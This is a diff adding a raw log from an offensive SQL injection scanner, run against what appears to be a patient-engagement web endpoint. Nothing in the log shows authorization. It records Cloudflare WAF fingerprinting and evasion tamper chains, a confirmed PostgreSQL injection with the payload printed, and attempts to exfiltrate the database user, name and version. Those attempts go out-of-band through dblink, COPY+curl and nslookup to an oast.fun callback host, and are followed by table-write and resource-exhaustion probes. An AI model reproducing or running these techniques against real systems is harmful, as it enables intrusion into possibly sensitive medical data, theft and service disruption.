@@ -1,0 +1,955 @@
+[+] [v21] Adaptive Extraction ENABLED (mutation_engine=SQLMutationEngine)
+[+] [v21]   Max bypasses: 10
+[+] [v21]   WAF threshold: 30%
+[+] [v21]   Max recovery attempts: 15
+
+============================================================
+[SQLReaper v25] Scan starting 09:57:44 url='/patient_engagement/placem
+============================================================
+[+] [*] SQLReaper v26.0 starting — 6 DBMSes × 10 techniques × 300 payloads
+[+] [Estimate] 5 params  6 DBMS  ~21 techniques
+[+] [Estimate] ~819 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~10 minutes
+[*] Estimated scan time: 10m 55s (5 params × 6 DBMSes × 21 techniques, level=1)
+[+] [Session] Resuming from saved state: 0 params completed, dbms=PostgreSQL
+[!] StealthEngine: blocking detected, delay  1.2s
+[!] StealthEngine: blocking detected, delay  3.1s
+[!] StealthEngine: blocking detected, delay  7.8s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[+] ML WAF fingerprint: Cloudflare (conf=0.94)
+[+] ML WAF: Cloudflare
+[+] [v19] WAFMLBypassGenerator activated (WAF=Cloudflare, waf_bypass=5)
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: blocking detected, delay  12.0s
+[!] StealthEngine: 5 consecutive max-delay blocks — WAF not responding to delay strategy. Permanently disabling backoff, delay fixed at 0.5s (BUG-V198-STEALTH-SAWTOOTH FIX)
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   No boolean/timing differentiation  TIMING_ONLY oracle
+   Use --playwright to handle JS challenge, or resolve manually
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   No boolean/timing differentiation  TIMING_ONLY oracle
+   Use --playwright to handle JS challenge, or resolve manually
+[+] Safe-mode verification:
+ Ready to scan [oracle=timing_only]
+   WAF challenge page detected on clean request
+   Neither error nor boolean signal detected on clean probes  may be blind-only
+   No boolean/timing differentiation  TIMING_ONLY oracle
+   Use --playwright to handle JS challenge, or resolve manually
+[+] [OracleMode] Selected: timing_only
+[+] Pre-scan verification OK
+[!] Jitter profile: HIGH_JITTER cv=0.94  timing unreliable, prefer boolean
+[!] Jitter profile recommends SLEEP(3.0s) (target natural variance too high for 2.0s)
+[+] Auto-adjusted --time-sec to 3.0s
+[!] Timing unreliable  deprioritising time-based detection
+[+] [v19] Oracle mode confirmed: timing_only
+[*] [diag-cascade] _v14_cascade entered: url='/patient_engagement/placements?countr'
+[+] KB tamper chain: ['space2multicomment', 'case_variation_extended', 'paramfragment', 'percentencode_selective', 'overlong_utf8']
+[*] [diag-cascade] discovered params: ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire'] markers=[]
+[*] Conformal calibration block complete, proceeding to causal discovery...
+[+] [Estimate] 3 params  6 DBMS  ~10 techniques
+[+] [Estimate] ~234 probes at ~1.2 req/s
+[+] [Estimate] Estimated time: ~3 minutes
+
+[*] ══════════════════════════════════════════════════════
+[*]  SCAN PLAN: 1 DBMS × 10 categories × 8 params × 3 methods
+[*]  DBMSes   : ['PostgreSQL']
+[*]  Params   : ['country', 'variant', 'channel', 'target', 'limit', 'ssid', 'rum', 'expire']
+[*]  Categories: ['Boolean', 'Timebased', 'Error', 'Union', 'Stacked', 'Standard', 'Novel', 'WAFBypass', 'Exotic', 'Hybrid']
+[*]  Payloads  : 300 per DBMS×category at level 1 = 3000 total
+[*] ══════════════════════════════════════════════════════
+
+[+]  Endpoint [1/1]: POST /patient_engagement/placements (8 params, source=direct)
+[*] A/B detection profiling for 'country'...
+[*] Stability profiling for 'country'...
+[!] [TimingCal] CDN-cached baseline (P95=0.0ms < 5ms) — baseline probes served from edge cache.  Injection payloads bypass CDN cache and hit backend directly.  Jitter profiler will refine sleep estimate against real backend latency.
+[+] [TimingCal] Baseline: median=0ms P95=0ms IQR=0ms  optimal SLEEP=1.0s
+[Gate]  All 12 optimizations enabled
+[*] [RateCalibrate] Probing rate limits on /patient_engagement/placements?countr...
+[*] [RateCalibrate] User specified --rpm 60, respecting user setting
+[*] [RateCalibrate] Completed
+[*] [RDF] Profiling server response to suspicious headers (6 probes)...
+[+] [RDF] Result: WAF_GENERIC
+[+] [RDF] Headers: WAF blocks ALL suspicious input identically ((400, 500)  (400, 100))
+[!] [RDF]  Boolean-blind flag noted — disabling B/BH/IN techniques for this surface
+[+] Launching expanded surfaces in parallel (WAF: Cloudflare)
+[*] [diag-task] creating primary task: param='country' orig='fr'
+[*] [HDR] Preparing 138 headers for batched scanning ( GET/POST/PUT  all techniques  all DBMS)...
+[*] [COOKIE] Probing for injectable cookies...
+[*] [PUT] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PUT:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PUT:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'country'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,NV,T,ST,HQ,BT,TH,HY,EX,S (was ALL)
+[*] [PATCH] Full cascade scan starting (all techniques  all DBMS)...
+[*] [diag-surface] scan_surface called: surface='PATCH:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'PATCH:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'country'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,NV,T,ST,HQ,BT,TH,HY,EX,S (was ALL)
+[*] [diag-surface] scan_surface called: surface='POST:/patient_engagement/placements' params=['country']
+[+] Scanning surface: 'POST:/patient_engagement/placements' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='country' already_confirmed=False
+[*] --- testing 'country' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'country'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='country' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'country'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,NV,T,ST,HQ,BT,TH,HY,EX,S (was ALL)
+[*] [COOKIE] No Set-Cookie headers in response  skipping cookie injection
+[*] [HDR] Scanning 138 headers in batches of 1...
+[*] [diag-surface] scan_surface called: surface='HDR:X-Forwarded-For:POST' params=['X-Forwarded-For']
+[+] Scanning surface: 'HDR:X-Forwarded-For:POST' (1 parameters)
+[*] [diag-probe] _probe_one_param entry: param='X-Forwarded-For' already_confirmed=False
+[*] --- testing 'X-Forwarded-For' @ /patient_engagement/placements?country=fr&varia
+[*]   evasion: chunked, HPP, random-UA, multipart
+[*] Building baseline for 'X-Forwarded-For'...
+[*] Baseline ready (status=200)
+[*] Starting technique cascade (ALL)...
+[*] Using calibrated gap=0.250
+[*] [diag] entering try_all: param='X-Forwarded-For' gate_killed=False gate_circuit=False oracle=OracleMode.TIMING_ONLY techniques=ALL
+[*] Cascade engine: testing 'X-Forwarded-For'...
+[+]   [try_all] Oracle=TIMING_ONLY (WAF-blocking)  extended set includes WAF-bypass categories ST/NV/WB/EX/HY
+[+]   [try_all] Oracle=TIMING_ONLY  restricting techniques to WB,NV,T,ST,HQ,BT,TH,HY,EX,S (was ALL)
+
+[*] ╔══════════════════════════════════════════════════════╗
+[*] ║  DBMS [1/1]: PostgreSQL   | 10 categories x 300 payloads ║
+[*] ╚══════════════════════════════════════════════════════╝
+[*] [diag] PostgreSQL base_tech_map non-empty: {'T': 2698, 'S': 2698, 'HQ': 2698, 'TH': 2698, 'BT': 2698, 'WB': 2698, 'NV': 2698, 'EX': 2698, 'HY': 2698, 'ST': 2698}
+    [T] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'T': 2698, 'S': 2698, 'HQ': 2698, 'TH': 2698, 'BT': 2698, 'WB': 2698, 'NV': 2698, 'EX': 2698, 'HY': 2698, 'ST': 2698}
+    [T] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+[*] [diag] PostgreSQL base_tech_map non-empty: {'T': 2698, 'S': 2698, 'HQ': 2698, 'TH': 2698, 'BT': 2698, 'WB': 2698, 'NV': 2698, 'EX': 2698, 'HY': 2698, 'ST': 2698}
+    [T] PostgreSQL: 2698 payloads
+    [S] PostgreSQL: 2698 payloads
+    [HQ] PostgreSQL: 2698 payloads
+    [TH] PostgreSQL: 2698 payloads
+    [BT] PostgreSQL: 2698 payloads
+    [WB] PostgreSQL: 2698 payloads
+    [NV] PostgreSQL: 2698 payloads
+    [EX] PostgreSQL: 2698 payloads
+    [HY] PostgreSQL: 2698 payloads
+    [ST] PostgreSQL: 2698 payloads
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 537 base payloads (2698 expanded)
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 537 base payloads (2698 expanded)
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 537 base payloads (2698 expanded)
+[*] [diag] PostgreSQL base_tech_map non-empty: {'T': 2698, 'S': 2698, 'HQ': 2698, 'TH': 2698, 'BT': 2698, 'WB': 2698, 'NV': 2698, 'EX': 2698, 'HY': 2698, 'ST': 2698}
+[*] │   Testing 10 technique codes in order: ['ST', 'HY', 'T', 'NV', 'TH', 'WB', 'BT', 'HQ', 'EX', 'S']
+[*] ├─ [6/10] PostgreSQL › Standard   │ tech=ST   │ 537 base payloads (2698 expanded)
+[*] testing 'PostgreSQL standard technique' (param='country' req#1)
+[*] testing 'PostgreSQL standard technique' (param='country' req#2)
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#3)
+[*] testing 'PostgreSQL standard technique' (param='country' req#4)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.500 combined=0.700 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='country' req#5)
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='country' req#6)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#1 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#7)
+    [B-bool] [PostgreSQL] 'country' req#1 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#2)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='country' req#8)
+[*] testing 'PostgreSQL standard technique' (param='country' req#9)
+[*] testing 'PostgreSQL standard technique' (param='country' req#10)
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#11)
+[*] testing 'PostgreSQL standard technique' (param='country' req#12)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL standard technique' (param='country' req#13)
+    [B-bool] [PostgreSQL] 'X-Forwarded-For' req#4 sim=0.438 combined=0.663 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#5)
+[*] testing 'PostgreSQL standard technique' (param='country' req#14)
+[*] testing 'PostgreSQL standard technique' (param='country' req#15)
+    [B-bool] [PostgreSQL] 'country' req#4 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='X-Forwarded-For' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='X-Forwarded-For' req#16)
+[*]    Wasserstein comparison probe (param='country' req#5)
+[+]   [Wasserstein] dist=0.0195 below threshold 0.25  not confirmed
+[*] testing 'PostgreSQL standard technique' (param='country' req#17)
+[*] testing 'PostgreSQL standard technique' (param='country' req#18)
+    [B-bool] [PostgreSQL] 'country' req#7 sim=0.500 combined=0.700 thresh=0.800  DIFF
+[*]    Wasserstein comparison probe (param='country' req#8)
+[+]   [Wasserstein] secondary oracle confirmed (dist=0.6795, threshold=0.25)  accepting boolean detection
+[!!] SQL INJECTION CONFIRMED [ST] PostgreSQL (pre-verified  early escalation before scan-stop gate) — starting extraction
+[!] [Gate] KILL  all scanning stopped, extraction-only mode
+[*] [MultiVote] Param 'country' voted confidence: 72% (votes: {'ST': 0.72})
+
+[!!] SQL injection confirmed!
+    Parameter : 'country'
+    URL       : /patient_engagement/placements?country=fr&variant=desktop
+    Technique : ST
+    DBMS      : PostgreSQL
+    Bypass    : none
+    Confidence: 72%
+    Payload   : ' || CASE WHEN ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718) THEN 1e0 ELSE 0e0 '
+    Requests  : 8
+
+[+] Vulnerability confirmed  param='country' technique=ST dbms=PostgreSQL
+[+] Injection confirmed  cancelled 3 background tasks immediately
+[*] Injection confirmed on 'country'  launching extraction — all scanning stopped
+[*] [Extraction] _extraction_first running: owner=True active=True param='country'
+[*] Extraction started for 'country'
+[+] BG injection confirmed  primary scan cancelled for fast extraction
+[+] Injection confirmed  cancelled remaining background scans
+[*] Collecting background surface results...
+[+] [BGExtraction] Recovered country [ST] PostgreSQL from event
+[+] Minimising payload: 83 chars  ?
+[+] Minimised: 83  83 chars (8 probes)
+[+]  'country': ST [WHERE_STRING] bypass=direct conf=72%
+[+] [PATCH-5] Second injection point param='country' technique=ST dbms=PostgreSQL — logging only, extraction already active/done (Req 5).
+[!] [ExtractionGuard] Extraction already running on 'country@PostgreSQL@POST'  blocking parallel extraction of 'country' (Issue 5 fix: never two extractions)
+[+] [*] Skipping extended surfaces  injection already confirmed
+[*] Waiting for extraction to complete before exiting...
+[!] [V25-Extract] WB SimHash oracle ABORTED for tech='ST': calibration probes WAF-blocked (true_status=400 true_blocked=True, false_status=400 false_blocked=True) — cannot determine oracle discrimination ability.
+[!] [V25-Extract] WB polarity calibration probe was WAF-blocked (status=400, body=557B) — skipping polarity inversion to avoid false-inverted oracle
+[!] [V25-Extract] ConditionalErrorOracle failed AND no inline oracle available for tech='ST' — extraction will return empty strings.
+[+] --- Auto-extraction starting ---
+[+] [Inference] Detection payload: Fr/*6x*//*No*/|/*Y9%5A*/|  c%61%53%45/*%74o*//*i%4E*/W%68EN   %61rrAy_l
+[+] [Inference] DBMS: PostgreSQL | Tamper chain: []
+[+] [Inference] Template (boolean-append): Fr/*6x*//*No*/|/*Y9%5A*/|  c%61%53%45/*%74o*//*i%4E*/W%68EN   %61rrAy_lOWe%72(a%5
+[+] [Inference] No sleep value in detection payload — falling back to 0.5s
+[+] [Inference] Cleared stale progress: output/inference_progress
+[+] [Inference] Cooling down 5s before calibration...
+[+] [Inference] Calibrating with detection template (delay=0.5s)...
+[+] [Inference] Calibration 1: TRUE=236ms FALSE=230ms margin=7ms
+[+] [Inference] Calibration 2: TRUE=249ms FALSE=303ms margin=-54ms
+[+] [Inference] Best margin: 7ms
+[+] [Inference] CDN-cached response (203ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN-cached response (216ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] Boolean oracle not detected after 3 attempts
+[+] [Inference] Multi-sample Wasserstein boolean oracle check (n=12 pairs) ...
+[+] [Inference] CDN-cached response (207ms < 220ms) — waiting 30s for CDN TTL expiry and retrying
+[+] [Inference] CDN retry also fast (219ms) — origin is fast, disabling CDN wait for remaining probes
+[+] [Inference] Wasserstein mean=0.008 n=12 (threshold=0.25)
+[+] [Inference] WHERE blocked (margin=7ms)  trying arithmetic template
+[+] [Inference] All template approaches failed — trying sleep floor before final abort
+[+] [Inference]  Threshold=233ms (margin=7ms)
+[!] [Inference] Timing oracle UNRELIABLE: margin=7ms < min=400ms (CDN noise exceeds injection signal — timing extraction skipped)
+[!] [Inference] BUG-V214-A FIX: all standard oracles failed for non-timing technique 'ST' — attempting baseline-similarity oracle (CTX-bool style)
+[!] [Inference] Baseline-similarity oracle: sim_t=0.500 sim_f=0.500 gap=0.000
+[+] [Inference] No boolean oracle and timing unreliable  aborting extraction (re-run with longer sleep e.g. --time-sec 2 or wait for CDN cache expiry)
+[+] [Inference] No data extracted  trying side channels
+[+] [SchemaEnumV18] Inference returned no DB name — activating SchemaEnumeratorV18 enhanced enumerator
+[+] [SideChannel] DNS OOB extraction  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [SideChannel] Advanced DNS: dblink
+[+] [SideChannel] Advanced DNS: copy_nslookup
+[+] [SideChannel] Advanced DNS: copy_curl
+[+] [SideChannel] HTTP exfil: copy_curl
+[+] [SideChannel] HTTP exfil: copy_wget
+[SideChannel] Probing WHERE-ERROR (4 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] Probing CONNECTION KILL oracle...
+[SideChannel] Probing LOCK CONTENTION oracle...
+[SideChannel]   locked=236ms free=267ms margin=-30ms
+[SideChannel]  Lock contention not viable
+[SideChannel] Probing LARGE OBJECT oracle...
+[+] [SideChannel] No side channels  trying DIRECT extraction before MSE
+[+] [Direct] Detection payload: || CASE WHEN ARRAY_LOWER(ARRAY[1e0,2e0,3e0],1e0)!~~LN(2.718)
+[+] [Direct] No sleep or heavy-query pattern — skipping direct timing extraction
+[+] [Direct] Falling back to MSE timing
+[+] [Novel]  Starting 7 novel WAF bypass extraction techniques 
+[+] [Novel] Technique 1: WAF Weaponization (using WAF as boolean oracle)
+[+] [Novel-1] Sending clean baseline probe...
+[+] [Novel-1] Testing WAF trigger 1/7: <script>alert(1)</script>...
+[+] [Novel-1] Testing WAF trigger 2/7: ../../../../../../etc/passwd...
+[+] [Novel-1] Testing WAF trigger 3/7: <img src=x onerror=alert(1)>...
+[+] [Novel-1] Testing WAF trigger 4/7: javascript:alert(1)...
+[+] [Novel]  WAF trigger #3 skipped: TRUE400==FALSE400 (no differentiation)
+[+] [Novel] Technique 2: Micro-timing (statistical sub-threshold delays)
+[+] [Novel-2] Micro-timing sample 1/10...
+[+] [Novel-2] Micro-timing sample 6/10...
+[+] [Novel]  Micro-timing not viable (noise too high)
+[+] [Novel] Technique 3: Resource bomb (asymmetric computation)
+[+] [Novel]  Resource bomb not viable (margin=-46ms)
+[+] [Novel] Technique 4: Alternative DNS exfil vectors
+[+] [Novel] DNS vector 'dblink_connect' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for user  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for database  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'dblink_connect' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'xml_entity' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_dns' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] DNS vector 'copy_curl_http' fired for version  check aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[+] [Novel] Technique 4: polling OAST for DNS callbacks (30s)...
+[+] [Novel] Technique 5: Connection pool exhaustion oracle
+[+] [Novel] Connection exhaustion test: status after lock = 400
+[+] [Novel] Technique 6: Write-then-read (two-stage)
+[+] [Novel]  Write-then-read response: <html>
+<head><title>400 Bad Request</title></head>
+<body>
+<center><h1>400 Bad Request</h1></cente
+[+] [Novel] Technique 7: Response splitting via config/session vars
+[+] [Novel] Technique 8: Conditional error type oracle
+[+] [Novel]  No error type produces different response
+[+] [Novel] Technique 9: Prepared statement keyword bypass
+[+] [Novel] Prepared statements sent for database
+[+] [Novel] Prepared statements sent for version
+[+] [Novel] Technique 10: Application state mutation
+[+] [Novel] State mutation 'table_write' sent for user
+[+] [Novel] State mutation 'comment_inject' sent for user
+[+] [Novel] State mutation 'sequence_name' sent for user
+[+] [Novel] State mutation 'table_write' sent for database
+[+] [Novel] State mutation 'comment_inject' sent for database
+[+] [Novel] State mutation 'sequence_name' sent for database
+[+] [Novel] State mutation 'table_write' sent for version
+[+] [Novel] State mutation 'comment_inject' sent for version
+[+] [Novel] State mutation 'sequence_name' sent for version
+[+] [Novel] Technique 11: TCP/response size inflation
+[+] [Novel]  TCP inflation not viable (WAF blocked: inflated_sc=400 normal_sc=400)
+[+] [Novel] Technique 12: Nested/multi-layer encoding bypass
+[+] [Novel] Technique 13: Conditional redirect detection
+[+] [Novel]  No redirect differentiation
+[+] [Novel] Technique 14: Cache key manipulation
+[+] [Novel]  Cache oracle not viable (margin=1ms)
+[+] [Novel] Technique 15: CHR() keyword bypass
+[+] [Novel] CHR() bypass sent for version
+[+] [SideChannel]  Extracting via side channels 
+[SideChannel] Auto-registered OOB domain: aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] DNS OOB: version()  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (231ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (211ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (191ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (215ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.aitlttgserrmsjibhyvo21byfocux597j.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (4 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] Probing CONNECTION KILL oracle...
+[SideChannel] Probing LOCK CONTENTION oracle...
+[SideChannel]   locked=231ms free=253ms margin=-22ms
+[SideChannel]  Lock contention not viable
+[SideChannel] Probing LARGE OBJECT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_catalog  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (198ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (291ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (242ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (219ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.aitlttgserrmsjibhyvo21byfocux597j.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (4 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] Probing CONNECTION KILL oracle...
+[SideChannel] Probing LOCK CONTENTION oracle...
+[SideChannel]   locked=265ms free=210ms margin=55ms
+[SideChannel]  Lock contention not viable
+[SideChannel] Probing LARGE OBJECT oracle...
+[SideChannel] No viable side channel found
+[SideChannel] DNS OOB: current_user  aitlttgserrmsjibhyvo21byfocux597j.oast.fun
+[SideChannel] Sending 4 OOB methods...
+[SideChannel]   dblink_u: dblink_connect_u DNS (no extension needed)
+[SideChannel]     status=400 (226ms) (WAF-blocked)
+[SideChannel]   dblink: dblink_connect DNS (needs dblink extension)
+[SideChannel]     status=400 (224ms) (WAF-blocked)
+[SideChannel]   copy_curl: COPY+curl HTTP exfil (superuser only)
+[SideChannel]     status=400 (233ms) (WAF-blocked)
+[SideChannel]   copy_nslookup: COPY+nslookup DNS (superuser only)
+[SideChannel]     status=400 (302ms) (WAF-blocked)
+[SideChannel]  All OOB methods returned error/blocked status codes — polling anyway (DNS resolves before TCP; callbacks may exist)
+[SideChannel] Polling callback server for DNS interactions (45s)...
+[SideChannel] No OOB callback received after 45s
+
+[SideChannel] 
+[SideChannel]   Check your callback server for DNS/HTTP    
+[SideChannel]   queries to: *.aitlttgserrmsjibhyvo21byfocux597j.oast.fun 
+[SideChannel]   Data is hex-encoded in the subdomain       
+[SideChannel]   Decode with: echo HEX | xxd -r -p         
+[SideChannel] 
+[SideChannel] Probing WHERE-ERROR (4 strategies)...
+[SideChannel]  No WHERE-ERROR strategy viable
+[SideChannel] Probing HEADER FINGERPRINT oracle...
+[SideChannel] Probing CONNECTION KILL oracle...
+[SideChannel] Probing LOCK CONTENTION oracle...
+[SideChannel]   locked=269ms free=254ms margin=15ms
+[SideChannel]  Lock contention not viable
+[SideChannel] Probing LARGE OBJECT oracle...
+[SideChannel] No viable side channel found
+[+] [SideChannel]  Side-channel found no data  MSE will try next 
+[MSE] Probing 8 oracles (stacked=False, dbms=PostgreSQL, baseline=265ms)...
+[MSE]   untampered: || CASE WHEN ARRAY_LOWER(ARRAY[1E0,2E0,3E0],1E0)!~~LN(2.718)...
+[MSE]  Testing 4 extraction strategies 
+[MSE]  End strategy testing 
